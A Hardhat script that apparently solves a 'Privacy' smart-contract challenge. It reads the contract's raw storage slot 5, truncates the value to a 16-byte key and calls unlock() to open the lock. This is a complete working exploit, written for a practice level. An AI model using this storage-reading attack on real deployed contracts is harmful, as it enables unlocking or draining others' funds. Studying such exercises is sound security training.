import { PRIVACY } from "../constants"
import { ethers } from "hardhat"
import { Privacy } from "../typechain-types"

const privacyExploit = async () => {
    const accounts = await ethers.getSigners()
    const exploiter = accounts[0]

    const privacy: Privacy = await ethers.getContractAt("Privacy", PRIVACY)

    console.log("privacy locked before exploit:", await privacy.locked())

    const key = await ethers.provider.getStorageAt(PRIVACY, 5) // key is stored in storage slot 5
    const key16Bytes = key.slice(0, 34)

    await (await privacy.unlock(key16Bytes)).wait()

    console.log("privacy locked after exploit:", await privacy.locked())
}

privacyExploit()
    .then(() => {
        console.log("privacy exploit completed")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
